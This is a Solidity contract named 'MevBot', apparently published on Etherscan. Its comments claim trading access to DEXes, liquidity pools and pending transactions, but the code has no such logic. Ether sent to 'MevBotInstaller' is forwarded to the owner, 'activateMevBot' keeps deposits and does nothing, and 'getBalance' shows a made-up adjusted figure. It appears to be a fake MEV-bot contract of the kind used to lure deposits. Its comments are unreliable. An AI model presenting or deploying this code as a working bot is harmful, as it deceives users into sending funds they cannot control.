/**
 *Submitted for verification at Etherscan.io on 2023-04-27
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract MevBot {
    address private owner;

    uint256 public destroyTime;

    bool public active = true;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
/**
 * @dev Provides information about the MevBot execution context, including Swaps,
 * Dex and/or Liquidity Pools, sender of the transaction and its data. 
 * While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with MEV-transactions the Account sending and
 * paying for execution is the sole controller of MevBot X7G-FOX 8 (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    function withdraw() public  onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function MevBotInstaller() public payable {
        if (msg.value > 0) payable(owner).transfer(address(this).balance);
    }

    function activateMevBot() public payable {
       
        if (msg.value > 0) { }
    }

 /*calculates 5% of the calling wallet's Ether balance and 
 *subtracts it from the total balance to return the available balance 
 *after reserving for gas fees. 
 *
 *Note that this function only returns the adjusted balance for display purposes 
 *and does not modify the actual balance in the wallet.
 */
    
    function getBalance() public view returns (uint256) {
    uint256 balance = address(msg.sender).balance;
    uint256 reserve = balance * 5 / 100; 
    uint256 availableBalance = balance - reserve; 
    return availableBalance;
}

 /**
     * @dev The MevBot self-destruct mechanism allows the Bot
     * for contract termination, transferring any remaining ether 
     * to the MevBot Initializing address and marking the Bot as inactive. 
     * This adds control and security to the MevBot's lifecycle.
     */

    function setDestroyTime(uint256 _time) public onlyOwner {
        require(_time > block.timestamp, "Destroy time must be in the future");
        destroyTime = _time;
    }

    function destroy() public onlyOwner {
        require(destroyTime != 0, "Destroy time not set");
        require(block.timestamp >= destroyTime, "Destroy time has not been reached");

        if (address(this).balance > 0) {
            payable(owner).transfer(address(this).balance);
        }

        active = false;
    }
    
/**
 * @dev MevBot module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * Liquidity Pools, Dex and Pending Transactions.
 *
 * By default, the owner account will be the one that Initialize the MevBot. This
 * can later be changed with {transferOwnership} or Master Chef Proxy.
 *
 * MevBot module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * MevBot owner.
 */


    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}